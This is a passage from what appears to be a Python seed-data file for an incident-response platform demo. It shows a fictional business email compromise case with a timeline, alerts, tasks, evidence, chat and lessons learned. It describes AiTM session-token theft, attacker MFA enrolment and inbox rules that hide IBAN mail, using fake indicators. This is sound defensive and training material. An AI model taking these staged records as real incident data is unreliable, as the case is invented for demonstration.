             '- [x] Confirmed no other tenant mailbox was accessed from either IP\n'
             '- [x] Recall of EUR 184,000 confirmed\n\n'
             '**Dwell time:** 5 days 19 hours. **Financial loss:** EUR 0 after recall.'),
            ('Lessons Learned',
             '## Lessons Learned\n\n'
             '1. Push-based MFA does not stop AiTM token theft. Rolling FIDO2 to Finance '
             'and Executive groups is the single highest-value fix and is now scheduled.\n'
             '2. Inbox-rule creation is not currently alerted on. This is a cheap, '
             'high-signal detection and should be enabled tenant-wide.\n'
             '3. The out-of-band payment callback **worked** — it caught payment 2 and is '
             'the reason the loss was contained. Make it mandatory for all IBAN changes, '
             'not just amounts over a threshold.\n'
             '4. Impossible-travel alerting did not fire because both IPs geolocated to the '
             'same country. Add ASN-change and user-agent-anomaly signals.'),
        ]),
    ],
    'timeline': [
        (0, 'Lure email delivered',
         'DocuSign-themed lure delivered to m.laurent from '
         'no-reply@docusign-review-portal.com with a link to the AiTM phishing page.',
         'Email Gateway', '#FFD700', 'Initial Access', True, True,
         ['m.laurent', 'MAIL-GATEWAY'],
         ['no-reply@docusign-review-portal.com',
          'https://login-microsftonline-secure.com/auth/verify?id=8823']),
        (37, 'Credentials and session token captured',
         'User authenticated through the proxied phishing page and completed the genuine '
         'MFA challenge. The resulting session token was captured by the attacker.',
         'Cloud Security', '#FF4500', 'Credential Access', True, True,
         ['m.laurent', 'LAPTOP-FIN-04'], ['login-microsftonline-secure.com']),
        (42, 'First token replay',
         'Mailbox accessed from 203.0.113.155 using the stolen session token. No MFA '
         'challenge was presented — the session was already authenticated.',
         'Cloud Security', '#FF0000', 'Initial Access', True, True,
         ['M365-TENANT', 'm.laurent'], ['203.0.113.155']),
        (51, 'Attacker authenticator enrolled',
         'A second authenticator app was registered on the account, giving the attacker '
         'independent access that survives session revocation.',
         'Cloud Security', '#FF0000', 'Persistence', True, True,
         ['M365-TENANT', 'm.laurent'], ['203.0.113.155']),
        (68, 'Malicious inbox rules created',
         'Two rules created moving supplier and IBAN-related mail to RSS Feeds and marking '
         'it read, hiding both supplier queries and internal verification traffic.',
         'Cloud Security', '#FF0000', 'Defense Evasion', True, True,
         ['M365-TENANT', 'm.laurent'], ['RSS Feeds']),
        (1500, 'Mailbox reconnaissance',
         'Repeated mailbox searches for invoice, IBAN and payment across several days from '
         'both attacker IPs.',
         'Cloud Security', '#FF8C00', 'Collection', True, True,
         ['M365-TENANT', 'm.laurent'], ['203.0.113.155', '198.51.100.240']),
        (8232, 'Fraudulent invoice sent',
         'Altered supplier invoice sent from the legitimate mailbox with an '
         'attacker-controlled IBAN and a reply-to of accounts@supplier-payments-eu.net.',
         'Email Gateway', '#FF0000', 'Impact', True, True,
         ['m.laurent', 't.okafor'],
         ['accounts@supplier-payments-eu.net', 'DE89 3704 0044 0532 0130 00',
          '198.51.100.240']),
        (8680, 'Payment of EUR 184,000 issued',
         'Finance processed the altered invoice and issued payment to the attacker IBAN.',
         'SIEM', '#FF0000', 'Impact', True, True,
         ['t.okafor'], ['DE89 3704 0044 0532 0130 00']),
        (9900, 'Second payment request blocked',
         'A follow-up request for EUR 97,500 was stopped by the out-of-band verification '
         'callback, which identified the changed IBAN.',
         'SIEM', '#32CD32', 'Unspecified', True, True,
         ['t.okafor'], ['DE89 3704 0044 0532 0130 00']),
        (9965, 'Sessions revoked and account remediated',
         'All sessions and refresh tokens revoked, attacker authenticator removed, inbox '
         'rules deleted, credentials reset.',
         'Cloud Security', '#32CD32', 'Remediation', False, True,
         ['M365-TENANT', 'm.laurent'], []),
        (11400, 'Funds recall confirmed',
         'Bank confirmed full recall of the EUR 184,000 payment. Net financial loss is zero.',
         'SIEM', '#32CD32', 'Remediation', False, True,
         ['t.okafor'], []),
    ],
    'tasks': [
        ('Revoke sessions and refresh tokens',
         'Invalidate every active session for m.laurent across the tenant.',
         'Done', 'containment'),
        ('Remove attacker-enrolled authenticator',
         'Delete the second authenticator registered by the attacker and re-enrol the user.',
         'Done', 'eradication'),
        ('Delete malicious inbox rules',
         'Remove both rules moving supplier and IBAN mail to RSS Feeds.',
         'Done', 'eradication'),
        ('Initiate bank recall',
         'Work with Finance and the bank to recall the EUR 184,000 payment.',
         'Done', 'financial'),
        ('Sweep tenant for other affected mailboxes',
         'Check every mailbox for sign-ins from 203.0.113.155 and 198.51.100.240.',
         'Done', 'hunting'),
        ('Roll out FIDO2 to Finance and Executive groups',
         'Push MFA does not defeat AiTM token theft. Phishing-resistant factors do.',
         'Done', 'hardening'),
        ('Enable alerting on inbox-rule creation',
         'Cheap, high-signal detection that would have caught this on day zero.',
         'Done', 'detection'),
    ],
    'evidence': [
        ('m.laurent-signin-logs.json', 'Log file',
         'Entra ID sign-in log export covering the full compromise window.',
         31457280, 'd5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4'),
        ('m.laurent-audit-log.json', 'Log file',
         'Unified audit log export: rule creation, authenticator enrolment, mailbox searches.',
         62914560, 'e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5'),
        ('fraudulent-invoice.eml', 'Email message',
         'The altered invoice as sent from the compromised mailbox, with full headers.',
         245760, 'f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6'),
        ('lure-email.eml', 'Email message',
         'Original DocuSign-themed phishing lure recovered from the mailbox.',
         131072, '08192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f7'),
        ('inbox-rules-export.json', 'Configuration file',
         'Export of both malicious inbox rules as configured by the attacker.',
         8192, '192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708'),
    ],
    'alerts': [
        ('Phishing link clicked by end user', 'Email Gateway', 'Medium', 'Escalated', None,
         37, ['m.laurent', 'LAPTOP-FIN-04'],
         ['https://login-microsftonline-secure.com/auth/verify?id=8823']),
        ('Sign-in from unfamiliar location', 'Cloud Security', 'Medium', 'Escalated', None,
         42, ['M365-TENANT', 'm.laurent'], ['203.0.113.155']),
        ('New MFA method registered', 'Cloud Security', 'High', 'Escalated', None,
         51, ['M365-TENANT', 'm.laurent'], ['203.0.113.155']),
        ('Suspicious inbox rule created', 'Cloud Security', 'High', 'Escalated', None,
         68, ['M365-TENANT', 'm.laurent'], ['RSS Feeds']),
        ('Anomalous mailbox search activity', 'UEBA', 'Medium', 'Closed',
         'True Positive With Impact', 1500, ['m.laurent'], ['198.51.100.240']),
        ('Outbound invoice with modified bank details', 'Email Gateway', 'Critical',
         'Escalated', None, 8232, ['m.laurent', 't.okafor'],
         ['accounts@supplier-payments-eu.net', 'DE89 3704 0044 0532 0130 00']),
        ('Session token replay detected', 'Cloud Security', 'High', 'Closed',
         'True Positive Without Impact', 42, ['M365-TENANT'], ['203.0.113.155']),
        ('Impossible travel', 'Cloud Security', 'Low', 'Closed', 'False Positive',
         1500, ['m.laurent'], []),
    ],
    'war_room': ('BEC — payment diversion, funds recalled', 'closed', 'High',
                 'Response room for the Finance mailbox compromise and EUR 184,000 payment '
                 'diversion. Closed — funds fully recovered.'),
    'chat': [
        (0, 'Confirmed BEC. Mailbox accessed from two IPs in unrelated ASNs, five days of '
            'dwell. EUR 184,000 already out the door.'),
        (1, 'Sessions and refresh tokens revoked. Also found and removed a second '
            'authenticator the attacker enrolled on day zero.'),
        (2, 'Two inbox rules were hiding supplier replies and any internal mail containing '
            '"IBAN". That is why nobody noticed for five days.'),
        (0, 'Recall is initiated with the bank. Finance stopped the second payment on their '
            'own via the callback procedure — that procedure is the reason this is not much '
            'worse.'),
        (1, 'Worth stating plainly in the report: MFA did not fail. The kit proxied the real '
            'login and stole the session token after the challenge succeeded.'),
        (0, 'Agreed, and the fix follows from it — FIDO2 for Finance and Executive.'),
        (2, 'Recall confirmed. Full EUR 184,000 recovered. Closing the room.'),
    ],
    'comments': [
        ('asset', 'm.laurent',
         'Fully remediated: sessions revoked, attacker authenticator removed, credentials '
         'reset, re-enrolled on FIDO2.'),
        ('asset', 'M365-TENANT',
         'Swept every other mailbox for sign-ins from both attacker IPs — no other account '
         'was accessed.'),
        ('ioc', 'login-microsftonline-secure.com',
         'AiTM kit, not a static credential harvester. It proxied the genuine login page, '
         'which is why the MFA challenge looked completely normal to the user.'),
        ('ioc', 'RSS Feeds',
         'Classic BEC tell. Nobody looks in RSS Feeds, so it is the default hiding place '
         'for rules like this.'),
        ('task', 'Roll out FIDO2 to Finance and Executive groups',
         'This is the control that actually defeats the attack. Push MFA would not have '
         'changed the outcome here.'),
    ],
}


# Round-robin source for demo case population. Order is stable so a given
# case index always gets the same incident across reboots.
SCENARIOS = [
    _PHISHING_C2,
    _RANSOMWARE,
    _INSIDER_EXFIL,
    _WEBAPP_COMPROMISE,
    _BEC,
]


def scenario_for_index(index):
    """Pick a scenario deterministically for a zero-based case index."""
    return SCENARIOS[index % len(SCENARIOS)]

